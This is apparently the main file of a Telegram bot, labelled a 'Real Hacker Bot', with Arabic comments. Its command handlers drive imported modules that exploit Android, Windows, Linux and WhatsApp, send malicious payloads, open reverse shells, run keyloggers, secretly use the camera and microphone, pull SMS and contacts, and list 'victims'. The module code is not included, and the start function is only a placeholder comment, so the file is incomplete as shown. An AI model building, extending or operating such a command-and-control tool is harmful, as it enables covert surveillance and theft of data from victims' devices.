#!/usr/bin/env python3
# 🔱 LØGHØST-Z 💀 – Real Hacker Bot

import os
import json
import logging
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from telegram.request import HTTPXRequest

# ===== استيرادات الموديولات =====
from modules.database import init_db
from modules.admin import admin_panel, show_victims, show_logs
from modules.exploits import exploit_android, exploit_windows, exploit_linux, exploit_whatsapp
from modules.payloads import send_payload, generate_payload
from modules.reverse_shell import start_reverse_shell, stop_reverse_shell
from modules.keylogger import start_keylogger, stop_keylogger, get_keylogs
from modules.camera import capture_camera
from modules.mic import record_mic
from modules.sms import get_sms
from modules.contacts import get_contacts

# ===== استيرادات وحدة فك التشفير (الجديدة) =====
from modules.crypto_cracker import (
    decrypt_file_command,
    decrypt_base64_cmd,
    decrypt_xor_cmd,
    decrypt_aes_cmd,
    handle_decrypt_file,
    handle_decrypt_text
)

# ======== تحميل الإعدادات ========
with open("config.json", "r") as f:
    config = json.load(f)

TOKEN = config["BOT_TOKEN"]
ADMIN_ID = config["ADMIN_ID"]

# ======== إعدادات ========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
init_db()

# ============================================
# 1. أوامر البوت
# ============================================
async def start(update, context):
    # ... الكود الموجود ...

async def help_command(update, context):
    help_msg = (
        "🔱 **أوامر البوت الخارق**\n\n"
        "/start - لوحة التحكم\n"
        "/admin - لوحة الإدارة\n"
        "/exploit_android - استغلال Android\n"
        "/exploit_windows - استغلال Windows\n"
        "/exploit_linux - استغلال Linux\n"
        "/send_payload - إرسال حمولة خبيثة\n"
        "/reverse_shell - تشغيل شل عكسي\n"
        "/keylogger - تشغيل كيلوغر\n"
        "/camera - تصوير الكاميرا\n"
        "/mic - تسجيل الميكروفون\n"
        "/sms - سحب الرسائل النصية\n"
        "/contacts - سحب جهات الاتصال\n"
        "/victims - عرض الضحايا\n"
        "/logs - عرض السجلات\n\n"
        "🔓 **أوامر فك التشفير (الجديدة)**\n"
        "/decrypt - فك تشفير ملف بايثون تلقائياً\n"
        "/base64 - فك تشفير Base64\n"
        "/xor - فك تشفير XOR\n"
        "/aes - فك تشفير AES"
    )
    await update.message.reply_text(help_msg, parse_mode="Markdown")

# ============================================
# 2. تشغيل البوت
# ============================================
def main():
    request = HTTPXRequest(connect_timeout=30.0, read_timeout=60.0)
    app = Application.builder().token(TOKEN).request(request).build()

    # ===== الأوامر الأساسية =====
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("exploit_android", exploit_android))
    app.add_handler(CommandHandler("exploit_windows", exploit_windows))
    app.add_handler(CommandHandler("exploit_linux", exploit_linux))
    app.add_handler(CommandHandler("exploit_whatsapp", exploit_whatsapp))
    app.add_handler(CommandHandler("send_payload", send_payload))
    app.add_handler(CommandHandler("reverse_shell", start_reverse_shell))
    app.add_handler(CommandHandler("keylogger", start_keylogger))
    app.add_handler(CommandHandler("camera", capture_camera))
    app.add_handler(CommandHandler("mic", record_mic))
    app.add_handler(CommandHandler("sms", get_sms))
    app.add_handler(CommandHandler("contacts", get_contacts))
    app.add_handler(CommandHandler("victims", show_victims))
    app.add_handler(CommandHandler("logs", show_logs))

    # ===== أوامر فك التشفير (الجديدة) =====
    app.add_handler(CommandHandler("decrypt", decrypt_file_command))
    app.add_handler(CommandHandler("base64", decrypt_base64_cmd))
    app.add_handler(CommandHandler("xor", decrypt_xor_cmd))
    app.add_handler(CommandHandler("aes", decrypt_aes_cmd))

    # ===== معالجات =====
    app.add_handler(CallbackQueryHandler(admin_panel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_decrypt_file))  # ← معالجة الملفات
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_decrypt_text))  # ← معالجة النصوص

    logger.info("💀 البوت الخارق يعمل...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()